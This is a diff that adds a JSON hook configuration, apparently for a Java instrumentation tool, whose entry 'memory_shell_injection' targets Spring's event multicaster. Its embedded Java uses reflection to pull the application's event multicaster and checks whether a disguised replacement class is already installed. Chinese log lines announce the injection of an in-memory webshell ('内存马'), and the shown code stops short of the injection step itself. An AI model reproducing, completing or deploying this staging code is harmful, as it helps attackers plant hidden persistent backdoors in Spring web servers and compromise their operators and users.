@@ -1,0 +1,6 @@
+{
+  "targetClass": "org.springframework.context.event.SimpleApplicationEventMulticaster",
+  "targetMethod": "multicastEvent",
+  "id": "memory_shell_injection",
+  "customCode": "try { org.springframework.web.context.request.ServletRequestAttributes attr = (org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes(); org.springframework.web.context.WebApplicationContext context = org.springframework.web.servlet.support.RequestContextUtils.findWebApplicationContext(attr.getRequest()); if (context == null) { System.out.println(\"无法获取 WebApplicationContext\"); return; } java.lang.reflect.Field field = org.springframework.context.support.AbstractApplicationContext.class.getDeclaredField(\"applicationEventMulticaster\"); field.setAccessible(true); Object currentMulticaster = field.get(context); System.out.println(\"当前 EventMulticaster 类型: \" + currentMulticaster.getClass().getName()); if (currentMulticaster.getClass().getName().contains(\"ExifilSimpleApplicationEventMulticaster\")) { System.out.println(\"内存马已存在，无需重复注入\"); return; } System.out.println(\"准备注入内存马到 EventMulticaster\"); } catch (Exception e) { System.err.println(\"内存马注入失败: \" + e.getMessage()); e.printStackTrace(); }"
+}
